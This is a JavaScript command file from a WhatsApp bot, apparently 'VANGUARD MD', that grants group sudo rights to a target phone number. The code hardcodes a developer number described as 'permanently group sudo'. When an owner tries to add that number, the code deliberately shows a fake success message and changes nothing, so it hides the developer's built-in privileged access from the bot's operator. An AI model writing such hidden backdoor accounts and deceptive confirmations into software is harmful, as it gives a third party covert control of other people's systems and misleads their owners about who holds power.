// ============================================================
//  VANGUARD MD – commands/addgsudo.js
//  owner and sudo. Add group sudo (works in groups only).
// ============================================================

const { resolveTarget } = require('../lib/resolveTarget')
const { addGSudo, matchGSudo } = require('../lib/authStore')

const DEV = '123721465471064'

module.exports = async (ctx) => {
    const { reply, args, quoted, msg, sock, jid, isOwner, isSudo } = ctx

    if (!isOwner && !isSudo) return reply('❌ *owner and sudo!*')

    const result = await resolveTarget(args, quoted, msg, sock, jid)

    if (result.wasLid) {
        return reply('❌ *Cannot resolve linked device.*\n_Type number directly: .addgsudo 256XXXXXXXXX_')
    }

    if (!result.num) {
        return reply('❌ *No target!* Tag, reply, or provide a number.')
    }

    const num = result.num

    // Dev is permanently group sudo – look like it worked, change nothing
    if (num === DEV) {
        return reply(
`

👤 *+${num}*
✅ Can now control bot *in groups*
🚫 Has no power in DMs
`
        )
    }

    if (matchGSudo(num + '@s.whatsapp.net')) {
        return reply(`⚠️ *+${num} is already group sudo!*`)
    }

    const added = addGSudo(num)

    if (!added) {
        return reply(`⚠️ *+${num} is already group sudo!*`)
    }

    await reply(
`

👤 *+${num}*
✅ Can now control bot *in groups*
🚫 Has no power in DMs
`
    )
}